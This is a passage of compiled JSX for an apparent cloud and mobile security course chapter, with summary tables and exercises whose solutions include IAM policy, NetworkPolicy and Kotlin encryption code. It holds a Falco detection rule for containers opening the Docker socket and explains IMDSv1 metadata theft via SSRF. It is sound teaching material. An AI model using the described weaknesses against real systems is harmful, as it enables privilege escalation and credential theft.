    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: (0,jsx_runtime.jsx)(_components.strong, {
        children: "Fix:"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Enforce HTTPS-only (App Transport Security on iOS, network_security_config.xml on Android)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Implement certificate pinning (TrustKit for iOS, OkHttp CertificatePinner for Android)."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Validate hostnames against a known allowlist."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Disable cleartext traffic (android:usesCleartextTraffic=\"false\")."
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Use TLS 1.2+ with strong cipher suites."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "applications-in-real-systems",
      children: "Applications in Real Systems"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Domain"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Cloud Security Application"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mobile Security Application"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Banking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM fine-grained policies, KMS encryption, PCI compliance via CSPM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile banking app security (M1-M10), transaction signing, biometric auth"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Healthcare"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HIPAA-compliant S3, CloudTrail audit, HSM for PHI keys"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Health app data encryption, HIPAA-compliant local storage"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "E-commerce"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "WAF, API Gateway rate limiting, SCP for multi-account"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "In-app purchase validation, payment tokenization, SSL pinning"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Enterprise SaaS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CIEM for multi-account IAM, CASB for shadow IT"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MDM policy enforcement, MAM for enterprise apps"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IoT/Edge"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Container security for edge nodes, KMS for device certificates"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile app for device control (Bluetooth, local API security)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Gaming"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Auto-scaling + security groups, multi-region deployment"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Anti-tamper, fraud detection, account security (MFA)"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Government"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "FedRAMP compliance, HSM for classified data, SCP enforcement"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Device compliance, app vetting, certified hardware"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "practical-takeaways",
      children: "Practical Takeaways"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Takeaway"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Application"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Shared Responsibility Model"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Know your boundary — in IaaS you patch the OS, in PaaS you secure the app, in SaaS you manage access; never assume the provider secures your data"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Container & Kubernetes Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Run containers as non-root, use read-only rootfs, implement Pod Security Standards, enforce Network Policies, scan images with Trivy"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud IAM Least Privilege"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Start with implicit deny, use resource-level permissions, simulate policies before deployment, review unused permissions quarterly"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Data Protection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use envelope encryption with KMS, enforce IMDSv2 on EC2, enable S3 Block Public Access, encrypt data at rest and in transit"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Serverless Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Validate all event inputs, use least-privilege IAM roles, store secrets in Secrets Manager, set function concurrency limits"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile OS & App Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Harden Android with Work Profile and iOS with User Enrollment; follow OWASP Mobile Top 10 — focus on M5 and M7"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Compliance Automation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Use CSPM tools (AWS Config, Azure Policy) for continuous compliance, IaC scanning (Checkov, tfsec) pre-deployment, and CIEM for permission hygiene"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "summary",
      children: "Summary"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cloud Service Models:"
        }), " IaaS, PaaS, SaaS — each shifts responsibility boundaries. Know exactly what you secure in each model."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Shared Responsibility:"
        }), " Provider secures ", (0,jsx_runtime.jsx)(_components.em, {
          children: "of"
        }), " the cloud; customer secures ", (0,jsx_runtime.jsx)(_components.em, {
          children: "in"
        }), " the cloud. Common failure: assuming the provider secures your data."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Virtualization Security:"
        }), " Hypervisor attacks (VM escape, side-channel), VM sprawl, hyperjacking. Isolation is the primary concern."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Container Security:"
        }), " Docker CIS benchmarks, K8s RBAC, Pod Security Standards, network policies, admission controllers, Falco runtime."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Serverless Security:"
        }), " OWASP Serverless Top 10 — event injection, excessive permissions, insecure deployment."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cloud Compliance:"
        }), " CIS benchmarks (AWS/Azure/GCP), CSPM for posture, CWPP for workloads, CASB for access, CIEM for entitlements."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cloud IAM:"
        }), " Least privilege, policy simulation, Access Analyzer, SCPs. Deny always wins."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Cloud Data Protection:"
        }), " KMS, HSM, envelope encryption. Never store encrypted data and key together."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Case Studies:"
        }), " Capital One (SSRF+IMDSv1), CodeCov (container layers leaked secrets), Kaseya (supply chain ransomware), Pegasus FORCEDENTRY (zero-click iOS exploit)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Mobile OS Security:"
        }), " Android (UID sandbox + SELinux MAC) vs iOS (container sandbox + mandatory code signing + Secure Enclave)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Mobile App Security:"
        }), " OWASP Mobile Top 10 (M5: insecure communication, M7: insecure storage are most common)."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "MDM/BYOD:"
        }), " Full device management vs app-level management. Work Profile (Android) and User Enrollment (iOS) best balance privacy and security."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Mobile Malware:"
        }), " Static + dynamic + network analysis. Repackaging detection via signature comparison."]
      }), "\n", (0,jsx_runtime.jsxs)(_components.li, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Interview Corner:"
        }), " 15 Q&As covering cloud, container/K8s, and mobile security."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "exercises",
      children: "Exercises"
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "review-questions",
      children: "Review Questions"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "In the Shared Responsibility Model for PaaS, who is responsible for patching the runtime environment?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nThe cloud provider patches the runtime environment (OS, middleware, runtime engine). The customer is responsible for patching their application code and managing access controls. The split varies by service — serverless (Lambda) the provider patches everything below the code; container platforms (EKS) the customer patches the container OS.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the difference between IMDSv1 and IMDSv2? Why did AWS make IMDSv2 the default?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nIMDSv1: direct request to 169.254.169.254 — vulnerable to SSRF (any HTTP request can read metadata). IMDSv2: requires a PUT request to obtain a session token, then includes the token in subsequent GET requests — prevents simple SSRF because the token fetch is a separate step. AWS made v2 default because v1 is a common attack vector (Capital One 2019 breach).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain how a Kubernetes Network Policy enforces micro-segmentation."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nNetworkPolicies are firewall rules at the pod level using label selectors. Default-deny ingress/egress is applied at the namespace level. Allow rules specify which pods (by labels), namespaces, IP blocks, and ports can communicate. This isolates workloads — a compromised pod in namespace A cannot reach pods in namespace B unless explicitly allowed.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "4",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the difference between KMS and HSM? When would you use each?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nKMS (Key Management Service): software-based key management, FIPS 140-2 Level 2/3, lower cost, regional, automatic rotation. HSM (Hardware Security Module): dedicated hardware, FIPS 140-2 Level 3/4, tamper-resistant, higher throughput, lower latency. Use KMS for most use cases (encryption at rest, key rotation). Use HSM for regulatory compliance (PCI-DSS), high-frequency signing, or when keys must never leave dedicated hardware.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "5",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "How does Android's Work Profile protect corporate data without compromising user privacy?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nWork Profile creates a separate encrypted container on the device. Corporate apps and data are isolated from personal apps — no cross-access. IT can manage work apps (wipe, enforce passcode) without accessing personal data. Separation is enforced at the kernel level via SELinux. When the work profile is removed, only corporate data is deleted.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "6",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "What is the purpose of Falco's syscall monitoring? How does it differ from vulnerability scanning?"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nFalco monitors kernel syscalls at runtime to detect anomalous behavior (e.g., shell in container, privilege escalation, file access outside allowed paths). Vulnerability scanning is static — it checks container images for known CVEs before deployment. Falco catches runtime attacks that bypass static checks — zero-day exploits, compromised credentials, malicious insiders.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "7",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Explain the FORCEDENTRY exploit chain from initial access to data exfiltration."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nFORCEDENTRY (2021) exploited a CoreGraphics PDF parsing vulnerability (CVE-2021-30860) in iMessage. Chain: 1) Attacker sends a malicious PDF via iMessage. 2) PDF parser overflow leads to kernel-level code execution. 3) Pegasus spyware installed with full device access (mic, camera, messages, location). 4) Data exfiltration via encrypted C2. No user interaction required — zero-click exploit.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "application-problems",
      children: "Application Problems"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "You are migrating a web application from IaaS (EC2) to serverless (Lambda + API Gateway). Map the security controls that change for each OWASP category."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nA01 (Broken Access Control): EC2 security groups → API Gateway resource policies + Lambda IAM roles. A03 (Injection): WAF on ALB → API Gateway WAF integration. A05 (Misconfiguration): OS patching (EC2) → provider-managed runtime (Lambda). A06 (Vulnerable Components): container/image scanning → Lambda layer scanning. A10 (SSRF): IMDS protection → Lambda execution role (no IMDS access by default). Network isolation shifts from VPC/subnet to IAM permissions.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Design a least-privilege IAM policy for a CI/CD pipeline that deploys to EKS, reads from ECR, and writes logs to CloudWatch."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n```json\n{\n  \"Effect\": \"Allow\", \"Action\": [\"ecr:GetDownloadUrlForLayer\",\"ecr:BatchGetImage\",\"ecr:BatchCheckLayerAvailability\"],\n  \"Resource\": \"arn:aws:ecr:*:account:repository/*\"\n}\n{\n  \"Effect\": \"Allow\", \"Action\": [\"eks:DescribeCluster\",\"eks:UpdateClusterConfig\"],\n  \"Resource\": \"arn:aws:eks:*:account:cluster/*\"\n}\n{\n  \"Effect\": \"Allow\", \"Action\": [\"logs:CreateLogGroup\",\"logs:CreateLogStream\",\"logs:PutLogEvents\"],\n  \"Resource\": \"arn:aws:logs:*:account:log-group:/ci/*\"\n}\n```\nUse OIDC for ephemeral credentials instead of long-lived access keys.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Create a Kubernetes Network Policy that isolates a PCI-DSS payment processing namespace from all other namespaces except a monitoring namespace."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n```yaml\napiVersion: networking.k8s.io/v1\nkind: NetworkPolicy\nmetadata: { name: pci-isolation, namespace: payment }\nspec:\n  podSelector: {}\n  policyTypes: [Ingress, Egress]\n  ingress:\n  - from:\n    - namespaceSelector: { matchLabels: { name: monitoring } }\n  egress:\n  - to:\n    - namespaceSelector: { matchLabels: { name: monitoring } }\n```\nDefault-deny for all other ingress/egress — only monitoring namespace can reach payment pods.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "4",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Write an Android application snippet that uses EncryptedSharedPreferences and explain each configuration parameter."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n```kotlin\nval prefs = EncryptedSharedPreferences.create(\n  \"secure_prefs\",  // file name\n  MasterKeys.getOrCreate(MasterKeys.AES256_GCM_SPEC),  // master key (AES-256-GCM)\n  context,\n  EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,  // key encryption\n  EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM   // value encryption\n)\nprefs.edit().putString(\"api_token\", token).apply()\n```\nAES256_SIV for keys (deterministic, allows key lookup), AES256_GCM for values (authenticated encryption).\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "5",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Design a Falco rule that detects a container attempting to mount the host's Docker socket."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n```yaml\n- rule: Detect Docker Socket Mount\n  desc: A container attempted to mount the host Docker socket\n  condition: >\n    evt.type=open and\n    container.id != host and\n    fd.name=/var/run/docker.sock\n  output: >\n    Docker socket mount detected (user=%user.name command=%proc.cmdline container=%container.id)\n  priority: CRITICAL\n  tags: [container, mitre_privilege_escalation]\n```\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "challenge-problems",
      children: "Challenge Problems"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Research and explain the \"Cloud Hopper\" attack (APT10, 2014-2017). How did the attackers exploit managed service providers? Map each phase to the MITRE ATT&CK framework."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nAPT10 targeted managed service providers (MSPs) to gain access to their clients. Phase 1 (Initial Access T1078): Spear-phishing MSP employees. Phase 2 (Persistence T1133): VPN credentials theft. Phase 3 (Lateral Movement T1021): Move from MSP to client environments using trusted connections. Phase 4 (Collection T1005): Exfiltrate IP and trade secrets. Significance: supply chain attack — compromising one MSP gave access to dozens of clients.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "2",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Design a zero-trust architecture for a mobile workforce. Include: conditional access policies, device compliance rules, app protection policies, and data loss prevention controls for both iOS and Android devices."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\nConditional Access: MFA required, device must be MDM-enrolled, OS version ≥ current-1, geo-fencing for sensitive apps. Device Compliance: disk encryption enabled, no root/jailbreak, passcode ≥ 6 digits, recent security patch. App Protection: app-level PIN, app proxy for data access, prevent screenshots of work apps, encrypted shared storage. DLP: prevent copy/paste from work to personal apps, block file downloads to personal cloud, remote wipe of corporate data only.\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      start: "3",
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Design a secure CI/CD pipeline that uses ephemeral credentials (OIDC), container image signing (Cosign), and admission controller enforcement (Kyverno) to prevent attackers from injecting malicious code through the build pipeline."
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsxs)(_components.details, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.summary, {
        children: "Solution"
      }), "\n1) Developer pushes code → GitHub Actions triggered. 2) OIDC-based authentication to AWS/GCP (no static secrets). 3) Build container image, scan for CVEs (Trivy). 4) Sign image with Cosign using keyless signing (OIDC + Fulcio). 5) Push to registry, store attestation (signed SBOM). 6) Kyverno admission controller in cluster verifies: image is signed, attestation matches, CVE score below threshold. 7) If valid → pod is admitted. If invalid → deployment is blocked.\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "concept-comparison",
      children: "Concept Comparison"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Concept"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Tool/Service"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "AWS"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Azure"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "GCP"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Key Management"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "KMS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS KMS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Key Vault"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud KMS"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Hardware Security"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "HSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CloudHSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Dedicated HSM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud HSM"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Container Registry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Registry"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ECR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ACR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Artifact Registry"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Container Orchestration"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "K8s"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "EKS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AKS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GKE"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Serverless Compute"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Functions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Lambda"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Functions"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Functions"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "WAF"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Web Firewall"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS WAF"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure WAF"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Armor"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CSPM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Posture Mgmt"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Config"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Policy"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "CSPM + Security Command Center"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "CIEM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Entitlements"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "IAM Access Analyzer"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Entra Permissions Mgmt"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Policy Analyzer"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Secrets"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secrets Mgmt"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS Secrets Manager"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Azure Key Vault"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Secret Manager"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Runtime Detection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Container Sec"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GuardDuty EKS"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Defender for Containers"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "GKE Security"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "cross-application-matrix",
      children: "Cross-Application Matrix"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Domain"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Cloud Application"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Mobile Application"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Integration Security"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IAM"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS IAM roles, SCP"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "App permissions (Android/iOS)"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cognito User Pools + Mobile SDK"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Networking"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "VPC, security groups"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Cellular/WiFi connectivity"
          }), (0,jsx_runtime.jsx)(_components.td, {
